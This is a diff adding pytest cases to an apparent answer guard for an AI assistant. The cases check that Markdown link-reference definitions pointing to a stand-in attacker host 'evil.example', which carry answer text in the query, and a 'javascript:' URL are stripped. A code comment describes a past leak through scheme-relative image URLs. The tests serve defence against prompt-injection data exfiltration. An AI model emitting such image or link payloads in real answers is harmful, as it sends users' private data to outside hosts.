@@ -92,6 +92,25 @@ def test_guard_keeps_http_and_schemeless_links_to_allowed_domains():
     assert cleaned == answer and removed == []
 
 
+@pytest.mark.parametrize("dest", ["//evil.example/p.png?q=leave", "<//evil.example/p.png?q=leave>",
+                                  "https://evil.example/p.png?q=leave", "javascript://harbourline.example/%0Aalert(1)"])
+def test_guard_checks_link_reference_definitions(dest):
+    # "![x][r]" takes its URL from a "[r]: ..." line anywhere in the answer. A scheme relative URL
+    # there is not a bare URL, so it used to pass untouched and the image leaked the answer.
+    for ref in ("![x][r]", "[the portal][r]", "![r]"):
+        answer = f"Leave is 18 days. {ref}\n\n[r]: {dest}\n\nAsk HR for more."
+        cleaned, removed = guard_answer(answer, allowed_domains=["harbourline.example"])
+        assert "evil.example" not in cleaned and "javascript" not in cleaned
+        assert "[r]:" not in cleaned and len(removed) == 1
+        assert "Leave is 18 days." in cleaned and "Ask HR for more." in cleaned
+
+
+def test_guard_keeps_link_reference_definitions_to_allowed_domains():
+    answer = "See [the policy][p].\n\n[p]: https://intranet.harbourline.example/leave \"Leave\""
+    cleaned, removed = guard_answer(answer, allowed_domains=["harbourline.example"])
+    assert cleaned == answer and removed == []
+
+
 def test_spotlight_boundary_is_random_and_wraps_every_passage():
     a, ba = spotlight(["one", "two"])
     b, bb = spotlight(["one", "two"])
